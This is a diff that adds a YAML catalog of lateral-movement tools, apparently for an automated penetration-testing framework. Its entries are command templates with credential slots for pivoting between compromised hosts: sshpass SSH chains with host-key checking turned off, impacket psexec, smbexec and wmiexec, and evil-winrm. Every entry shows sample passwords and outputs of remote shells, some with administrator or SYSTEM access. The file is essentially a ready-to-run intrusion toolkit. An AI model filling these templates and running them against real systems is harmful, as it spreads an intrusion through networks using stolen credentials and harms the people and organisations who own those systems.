@@ -1,0 +1,139 @@
+# Lateral Movement (TA0008): pivoting from one compromised host to another.
+# All tools assume valid credentials harvested earlier and accept them via
+# typed slot values.
+
+tools:
+  - name: ssh_pivot_to_internal_host
+    category: post-exploit
+    description: SSH from one compromised host to a second (lateral via shell).
+    command_template: "sshpass -p {first_pw} ssh -o StrictHostKeyChecking=no {first_user}@{first_ip} -p {first_port} 'sshpass -p {second_pw} ssh -o StrictHostKeyChecking=no {second_user}@{second_ip} whoami; id'"
+    slots:
+      - { name: first_ip, type: ip, description: jump host IP }
+      - { name: first_port, type: port, description: jump host SSH port, default: 22 }
+      - { name: first_user, type: free_string, description: jump host user }
+      - { name: first_pw, type: free_string, description: jump host password }
+      - { name: second_ip, type: ip, description: internal target IP }
+      - { name: second_user, type: free_string, description: internal target user }
+      - { name: second_pw, type: free_string, description: internal target password }
+    runtime_cap_seconds: 60
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0008]
+      techniques: [T1021.004]
+    example_invocation:
+      first_ip: 10.10.10.5
+      first_port: 22
+      first_user: bob
+      first_pw: hunter2
+      second_ip: 192.168.1.20
+      second_user: admin
+      second_pw: admin
+    example_output: |
+      admin
+      uid=1000(admin) gid=1000(admin) groups=1000(admin)
+
+  - name: psexec_remote_command
+    category: post-exploit
+    description: Run a command on a Windows target via SMB / impacket-psexec.
+    command_template: "impacket-psexec {domain}/{user}:{password}@{ip} {command}"
+    slots:
+      - { name: ip, type: ip, description: Windows target }
+      - { name: domain, type: hostname, description: AD domain (workgroup OK) }
+      - { name: user, type: free_string, description: account name }
+      - { name: password, type: free_string, description: account password }
+      - name: command
+        type: enum
+        description: command shell
+        values: [cmd.exe, powershell.exe]
+        default: cmd.exe
+    runtime_cap_seconds: 120
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0008, TA0002]
+      techniques: [T1021.002, T1059.001]
+    example_invocation:
+      ip: 10.10.10.5
+      domain: htb
+      user: Administrator
+      password: Hunter2
+      command: cmd.exe
+    example_output: |
+      Microsoft Windows [Version 10.0.19042.1466]
+      C:\Windows\system32>
+
+  - name: smbexec_remote_command
+    category: post-exploit
+    description: Semi-interactive shell via impacket-smbexec.
+    command_template: "echo whoami | impacket-smbexec {domain}/{user}:{password}@{ip}"
+    slots:
+      - { name: ip, type: ip, description: Windows target }
+      - { name: domain, type: hostname, description: AD domain }
+      - { name: user, type: free_string, description: username }
+      - { name: password, type: free_string, description: password }
+    runtime_cap_seconds: 120
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0008]
+      techniques: [T1021.002]
+    example_invocation:
+      ip: 10.10.10.5
+      domain: htb
+      user: alice
+      password: Spring2024
+    example_output: |
+      nt authority\system
+
+  - name: wmiexec_remote_command
+    category: post-exploit
+    description: Stealthier Windows lateral exec via WMI.
+    command_template: "echo {command} | impacket-wmiexec {domain}/{user}:{password}@{ip}"
+    slots:
+      - { name: ip, type: ip, description: Windows target }
+      - { name: domain, type: hostname, description: AD domain }
+      - { name: user, type: free_string, description: username }
+      - { name: password, type: free_string, description: password }
+      - { name: command, type: free_string, description: single Windows command (no metas) }
+    runtime_cap_seconds: 60
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0008]
+      techniques: [T1021.003, T1047]
+    example_invocation:
+      ip: 10.10.10.5
+      domain: htb
+      user: alice
+      password: Spring2024
+      command: hostname
+    example_output: |
+      DC01
+
+  - name: evil_winrm_session
+    category: post-exploit
+    description: Open an evil-winrm shell to run a single command. Closes after.
+    command_template: "evil-winrm -i {ip} -u {user} -p {password} -e {evil_dir} -s {scripts_dir} -c {one_off}"
+    slots:
+      - { name: ip, type: ip, description: Windows target }
+      - { name: user, type: free_string, description: username }
+      - { name: password, type: free_string, description: password }
+      - { name: evil_dir, type: file_path, description: evil-winrm exes dir }
+      - { name: scripts_dir, type: file_path, description: evil-winrm scripts dir }
+      - { name: one_off, type: free_string, description: PowerShell one-liner (no metacharacters) }
+    runtime_cap_seconds: 60
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0008]
+      techniques: [T1021.006]
+    example_invocation:
+      ip: 10.10.10.5
+      user: Administrator
+      password: Hunter2
+      evil_dir: /opt/evil-winrm/exes
+      scripts_dir: /opt/evil-winrm/scripts
+      one_off: whoami
+    example_output: |
+      htb\administrator
